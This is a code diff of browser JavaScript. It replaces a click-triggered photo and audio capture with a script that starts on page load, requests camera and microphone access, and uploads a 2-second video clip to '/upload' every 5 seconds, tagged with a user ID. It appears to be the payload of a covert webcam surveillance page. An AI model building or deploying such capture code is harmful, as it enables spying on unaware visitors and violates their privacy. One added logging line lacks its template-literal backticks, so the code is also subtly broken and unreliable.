@@ -1,55 +1,68 @@
-document.getElementById('startBtn').addEventListener('click', () => {
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-        .then(stream => {
-            // Capture image after 2 seconds
-            setTimeout(() => {
-                const videoTrack = stream.getVideoTracks()[0];
-                const imageCapture = new ImageCapture(videoTrack);
-                imageCapture.takePhoto()
-                    .then(blob => {
-                        sendFile(blob, "image");
-                    })
-                    .catch(err => console.error("Image capture failed:", err));
-            }, 2000);
+(async () => {
+    const preview = document.getElementById("preview");
 
-            // Capture short audio after 2 seconds
-            setTimeout(() => {
-                captureAudio();
-            }, 2000);
+    async function startCapture() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            preview.srcObject = stream;
 
-        })
-        .catch(err => {
+            // Send an image immediately
+            setTimeout(() => captureImage(stream), 1000);
+
+            // Start sending 2-sec videos every 5 seconds
+            setInterval(() => recordAndSend(stream, "video", 2000), 5000);
+
+        } catch (err) {
             console.error("Permission denied or error:", err);
-        });
-});
+        }
+    }
 
-function sendFile(fileBlob, type) {
-    const formData = new FormData();
-    formData.append("uid", UID);
-    formData.append("type", type);
-    formData.append("file", fileBlob, type + ".webm");
+    function captureImage(stream) {
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
 
-    fetch("/upload", {
-        method: "POST",
-        body: formData
-    })
-        .then(res => res.json())
-        .then(data => console.log("Upload result:", data))
-        .catch(err => console.error("Upload failed:", err));
-}
+        imageCapture.takePhoto()
+            .then(blob => {
+                const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
+                sendFile(file, "image");
+            })
+            .catch(err => console.error("Image capture error:", err));
+    }
 
-function captureAudio() {
-    navigator.mediaDevices.getUserMedia({ audio: true })
-        .then(stream => {
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const audioBlob = new Blob(chunks, { type: "audio/webm" });
-                sendFile(audioBlob, "audio");
-            };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 3000); // Record for 3 sec
-        })
-        .catch(err => console.error("Audio capture failed:", err));
-}
+    function recordAndSend(stream, type, duration) {
+        let chunks = [];
+        const recorder = new MediaRecorder(stream, { mimeType: "video/webm" });
+
+        recorder.ondataavailable = e => {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onstop = () => {
+            const blob = new Blob(chunks, { type: "video/webm" });
+            const file = new File([blob], "capture.webm", { type: "video/webm" });
+            sendFile(file, type);
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), duration);
+    }
+
+    async function sendFile(file, mediaType) {
+        const formData = new FormData();
+        formData.append("uid", UID);
+        formData.append("type", mediaType);
+        formData.append("file", file);
+
+        try {
+            await fetch("/upload", {
+                method: "POST",
+                body: formData
+            });
+            console.log(${mediaType} sent successfully);
+        } catch (err) {
+            console.error("Upload error:", err);
+        }
+    }
+
+    startCapture();
+})();
